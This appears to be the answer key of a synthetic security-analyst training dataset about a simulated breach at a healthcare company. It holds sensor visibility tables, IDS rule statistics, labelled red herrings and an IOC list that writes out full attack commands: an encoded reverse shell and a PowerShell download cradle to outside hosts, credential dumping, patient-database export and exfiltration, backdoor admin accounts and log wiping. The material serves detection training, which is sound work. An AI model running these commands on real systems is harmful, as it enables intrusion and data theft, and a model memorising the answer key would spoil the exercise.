| d2eaafa1-3dd5-4ea6-92ba-822499eec44d | ids | delayed: 1 |
| d41f74ef-82f6-4d3a-9c81-f9cbebedd43f | ids | delayed: 1 |
| d549aae3-ad9e-4d10-895b-485e09270065 | ids | delayed: 1 |
| d58e0ad1-8ba2-488c-a927-bd29f0136701 | ids | delayed: 2 |
| d803ec67-865d-4084-8cc0-1472739821f1 | ids | delayed: 1 |
| d86066b0-0f91-43aa-b94f-444dfb129438 | ids | delayed: 1 |
| d8ea023a-04a8-4504-9420-cd215eca26d8 | ids | delayed: 1 |
| dacec7a9-36ba-4b7e-bb46-bf633714488f | ids | delayed: 1 |
| ddbd0714-45c5-4f93-8eae-b36353235ee3 | ids | delayed: 1 |
| de866670-d3ce-4f8d-ae97-27849b3b4c8e | ids | delayed: 2 |
| e29e99d9-e755-4ddd-965f-42a624db1f39 | ids | delayed: 1 |
| e2ad18a6-7261-4e45-bfd0-c28a3d6439bc | ids | delayed: 1 |
| e37dbd6b-d08a-48b4-8f2d-4d596f926563 | ids | delayed: 1 |
| e4cd4f09-adae-46c3-b9f9-79025922d539 | ids | delayed: 1 |
| e4f96b39-1fc4-4038-9544-b3111ec5547c | ids | delayed: 1 |
| e81669a4-1740-4f10-a9f7-83ea89264de0 | ids | delayed: 2 |
| e86fcf34-3e1c-4ad4-b84a-5c8ef1bf2842 | ids | delayed: 1 |
| e87a8d3b-d73a-4504-8579-9699ca48ff80 | ids | delayed: 1 |
| e8a60a9c-147c-4a4a-9aff-d326e6540371 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 6, filtered: 4 |
| evt-002 | asa | delayed: 437, dropped: 1, filtered: 1, visible: 6 |
| evt-002 | ecar | delayed: 444, dropped: 1 |
| evt-002 | ids | delayed: 13, visible: 1 |
| evt-002 | web | delayed: 389, dropped: 1 |
| evt-002 | zeek | delayed: 645, filtered: 2, visible: 189 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | visible: 2 |
| evt-004 | asa | delayed: 1, visible: 1 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 1, visible: 2 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 65 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 19 |
| evt-006 | windows_security | delayed: 6 |
| evt-006 | zeek | delayed: 19, visible: 12 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 7 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 2, visible: 4 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 5, filtered: 5 |
| evt-012 | ecar | delayed: 14, dropped: 1 |
| evt-012 | sysmon | delayed: 4 |
| evt-012 | windows_security | delayed: 24 |
| evt-012 | zeek | delayed: 12, visible: 1 |
| evt-013 | asa | delayed: 3, filtered: 1 |
| evt-013 | ecar | delayed: 42 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 15 |
| evt-013 | zeek | delayed: 6 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 24 |
| evt-015 | sysmon | delayed: 22 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 2, visible: 2 |
| evt-016 | ecar | delayed: 36 |
| evt-016 | sysmon | delayed: 36 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 30 |
| evt-018 | ecar | delayed: 38 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 17, dropped: 1 |
| evt-018 | windows_security | delayed: 19, visible: 1 |
| evt-018 | zeek | delayed: 64, visible: 12 |
| evt-019 | asa | delayed: 4 |
| evt-019 | ecar | delayed: 4 |
| evt-019 | proxy | delayed: 4 |
| evt-019 | sysmon | delayed: 4 |
| evt-019 | zeek | delayed: 8 |
| evt-020 | asa | delayed: 21, filtered: 247, visible: 1 |
| evt-020 | ecar | delayed: 267, dropped: 2 |
| evt-020 | ids | delayed: 6, dropped: 3, filtered: 224 |
| evt-020 | sysmon | delayed: 14 |
| evt-020 | windows_security | delayed: 278, visible: 1 |
| evt-020 | zeek | delayed: 408, filtered: 8, visible: 122 |
| evt-021 | asa | delayed: 91 |
| evt-021 | ecar | delayed: 90, dropped: 1 |
| evt-021 | ids | delayed: 18, dropped: 1, filtered: 162 |
| evt-021 | windows_security | delayed: 90, visible: 1 |
| evt-021 | zeek | delayed: 130, visible: 52 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 6 |
| evt-023 | bash_history | visible: 11 |
| evt-023 | ecar | delayed: 42 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 4 |
| evt-023 | zeek | delayed: 7, visible: 3 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 4, visible: 6 |
| evt-026 | asa | delayed: 3, filtered: 3 |
| evt-026 | ecar | delayed: 7 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | zeek | delayed: 14, visible: 4 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 27 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 26 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 2, visible: 2 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 2, visible: 4 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 14 |
| evt-033 | sysmon | delayed: 13 |
| evt-033 | windows_security | delayed: 14 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 6, filtered: 2 |
| evt-email-001 | ecar | delayed: 11, dropped: 1 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 5 |
| evt-email-001 | windows_security | delayed: 4 |
| evt-email-001 | zeek | delayed: 14, visible: 4 |
| evt-email-002 | asa | delayed: 1 |
| evt-email-002 | ecar | delayed: 1 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | zeek | visible: 2 |
| evt-email-003 | asa | delayed: 6, filtered: 2 |
| evt-email-003 | ecar | delayed: 25 |
| evt-email-003 | syslog | delayed: 14 |
| evt-email-003 | sysmon | delayed: 24 |
| evt-email-003 | windows_security | delayed: 14 |
| evt-email-003 | zeek | delayed: 20 |
| evt-email-004 | asa | delayed: 8, filtered: 5 |
| evt-email-004 | ecar | delayed: 27 |
| evt-email-004 | syslog | delayed: 17, visible: 1 |
| evt-email-004 | sysmon | delayed: 12 |
| evt-email-004 | windows_security | delayed: 12 |
| evt-email-004 | zeek | delayed: 21, visible: 11 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 2, visible: 2 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 9 |
| evt-email-007 | asa | delayed: 7, filtered: 2, visible: 1 |
| evt-email-007 | ecar | delayed: 15 |
| evt-email-007 | proxy | delayed: 1 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 5 |
| evt-email-007 | zeek | delayed: 14, visible: 16 |
| evt-email-008 | asa | delayed: 9, filtered: 3 |
| evt-email-008 | ecar | delayed: 30 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 24 |
| evt-email-008 | windows_security | delayed: 12 |
| evt-email-008 | zeek | delayed: 20, visible: 10 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 6, filtered: 2 |
| evt-email-011 | ecar | delayed: 12 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 8 |
| evt-email-011 | windows_security | delayed: 8 |
| evt-email-011 | zeek | delayed: 14, visible: 9 |
| f20890af-2671-418b-997f-297e7b3e07f7 | ids | delayed: 1 |
| f270fc47-5ed3-4c21-919a-944b70790c60 | ids | delayed: 1 |
| f6844eab-4575-465f-80a4-c540081b07a3 | ids | delayed: 1 |
| f814c883-a329-456a-bd06-0022dee399b5 | ids | delayed: 1 |
| f8c8b79b-a44e-4c81-9258-4cf39a9ab4e2 | ids | delayed: 1 |
| fa66ac6f-c786-468b-9055-d2092238a028 | ids | delayed: 1 |
| fbc71299-319e-4d13-b1ec-9d53b9c777bc | ids | delayed: 1 |
| fe0bfa65-53a4-4d1f-95e3-360779260938 | ids | delayed: 1 |
| fe158544-9363-4b8f-8466-ab460aa24630 | ids | delayed: 1 |
| fe399941-ba96-4659-a9c5-14fb9917987c | ids | delayed: 1 |
| ffb1e68a-e407-4050-9436-da118e7cd535 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 3 |
| red_herring:rh-001 | windows_security | delayed: 3 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 33 |
| red_herring:rh-002 | sysmon | delayed: 32 |
| red_herring:rh-002 | windows_security | delayed: 8 |
| red_herring:rh-002 | zeek | visible: 1 |
| red_herring:rh-003 | asa | delayed: 3 |
| red_herring:rh-003 | ecar | delayed: 6 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 6 |


## IDS Evaluation Summary

Observation totals: delayed=194, dropped=4, filtered=387, visible=3.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `8c260ba0e273` |
| snort-core | 1:2000357 | 1 | 1 | 0 | built_in=1 | `bd79f689ea7a` |
| snort-core | 1:2000560 | 1 | 1 | 0 | built_in=1 | `b5878e4c190a` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `0a6250b82105` |
| snort-core | 1:2003068 | 1 | 1 | 0 | built_in=1 | `afff607d06f5` |
| snort-core | 1:2016149 | 6 | 6 | 0 | built_in=6 | `36f05968f515` |
| snort-core | 1:2024291 | 10 | 10 | 0 | built_in=10 | `8f8236f77ca0` |
| snort-core | 1:2024392 | 1 | 1 | 0 | built_in=1 | `b24fc74edbdf` |
| snort-core | 1:2027757 | 6 | 6 | 0 | built_in=6 | `dd794e39f26e` |
| snort-core | 1:2027863 | 9 | 9 | 0 | built_in=9 | `b949dd39c0ff` |
| snort-core | 1:2027865 | 95 | 14 | 81 | authored_attachment=9, built_in=5 | `5055729edaee` |
| snort-core | 1:2029706 | 234 | 10 | 224 | authored_attachment=6, built_in=4 | `e5f429e10cc9` |
| snort-core | 1:366 | 1 | 1 | 0 | built_in=1 | `5404c71e40d8` |
| snort-core | 1:384 | 1 | 1 | 0 | built_in=1 | `268a10cf29f8` |
| snort-perimeter | 1:2000334 | 2 | 2 | 0 | built_in=2 | `bcaedb740d77` |
| snort-perimeter | 1:2000357 | 2 | 2 | 0 | built_in=2 | `c398c1944110` |
| snort-perimeter | 1:2000428 | 2 | 2 | 0 | built_in=2 | `a9555483c8c0` |
| snort-perimeter | 1:2000575 | 7 | 7 | 0 | built_in=7 | `8c6453ef28ac` |
| snort-perimeter | 1:2002910 | 14 | 14 | 0 | built_in=14 | `7df75f30cd4e` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `17d0763237bd` |
| snort-perimeter | 1:2003068 | 10 | 10 | 0 | built_in=10 | `a755cd8313da` |
| snort-perimeter | 1:2010935 | 3 | 3 | 0 | built_in=3 | `2a78d5f2b59e` |
| snort-perimeter | 1:2013028 | 4 | 4 | 0 | built_in=4 | `d144a8739b1f` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `06c0d2c3030e` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `00f1c8666c04` |
| snort-perimeter | 1:2016360 | 7 | 7 | 0 | built_in=7 | `fa2ca1667480` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `83df840f2a13` |
| snort-perimeter | 1:2022476 | 2 | 2 | 0 | built_in=2 | `674f9ea09603` |
| snort-perimeter | 1:2023672 | 3 | 3 | 0 | built_in=3 | `4579be1420e7` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `9d0672ee32f4` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `8e1222de05ff` |
| snort-perimeter | 1:2024291 | 6 | 6 | 0 | built_in=6 | `ccd2c8fcfb68` |
| snort-perimeter | 1:2024392 | 4 | 4 | 0 | built_in=4 | `c30c76cb66d6` |
| snort-perimeter | 1:2024897 | 4 | 4 | 0 | built_in=4 | `e63381ee38eb` |
| snort-perimeter | 1:2025712 | 2 | 2 | 0 | built_in=2 | `a738f5060407` |
| snort-perimeter | 1:2025991 | 7 | 7 | 0 | built_in=7 | `a9c23c0a5d4c` |
| snort-perimeter | 1:2027316 | 4 | 4 | 0 | built_in=4 | `b6775e0dde25` |
| snort-perimeter | 1:2027757 | 3 | 3 | 0 | built_in=3 | `5447dfc0090a` |
| snort-perimeter | 1:2027863 | 6 | 6 | 0 | built_in=6 | `e949b14355b5` |
| snort-perimeter | 1:2027865 | 91 | 10 | 81 | authored_attachment=9, built_in=1 | `bf5190fa2419` |
| snort-perimeter | 1:2028401 | 4 | 4 | 0 | built_in=4 | `87e21a251e76` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `a495900f4e45` |
| snort-perimeter | 1:366 | 7 | 7 | 0 | built_in=7 | `52b9a02c6f22` |
| snort-perimeter | 1:382 | 3 | 3 | 0 | built_in=3 | `4970472219d7` |
| snort-perimeter | 1:384 | 3 | 3 | 0 | built_in=3 | `c5364b626509` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C2A6y1WgVLaazuehFY
- SMTP Zeek UID: C9plZL0robagA50DpT
- SMTP Zeek UID: CD54heGP2WdE9Dei5W
- SMTP Zeek UID: CG4w4szG4xy8t0Eypd
- SMTP Zeek UID: CKGGqCS6mBlHSqxZV3
- SMTP Zeek UID: CO6yrgZAjS7VMt5rTiU
- SMTP Zeek UID: CRigK1pBIuY9VNJFqj
- SMTP Zeek UID: CSmcgIXy4SVpkOnCyIy
- SMTP Zeek UID: CghBBVu5H5AhCJ2FHsE
- SMTP Zeek UID: Cpjqs0isXwLexheFm2
- SMTP Zeek UID: CqsLR1yoEuioiTcTkT
- SMTP Zeek UID: Csnq740gKtMgtF8LRxf
- SMTP Zeek UID: CvXBzHTeTzZxlm0Mhf
- SMTP Zeek UID: CzjxUAmSJonv9JrPxh
- SMTP Zeek UID: CzkXkWx9iBwLEVznL8
- Zeek UID: C05nSxvfrt0u0rdQ4l
- Zeek UID: C27WSABXzfCfv8RTQMG
- Zeek UID: C9TAY8KzLu08weuXTy
- Zeek UID: CLSNKHFiKXFeUExGClF
- Zeek UID: CQQSjn5M4pUmPbSRsk
- Zeek UID: CZZ8D25HqypySDtNQG
- Zeek UID: CZc8GjQ2K9KiaHg5XU
- Zeek UID: Cfy6pTZK6Dwku9aVUgv
- Zeek UID: Co7L6jbqq6DJylljw6
- Zeek UID: CxaFjvKHgvq8j5RXz
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:38 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:39 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:39 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:40 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:05:16 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:10:08 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:19 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:21 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
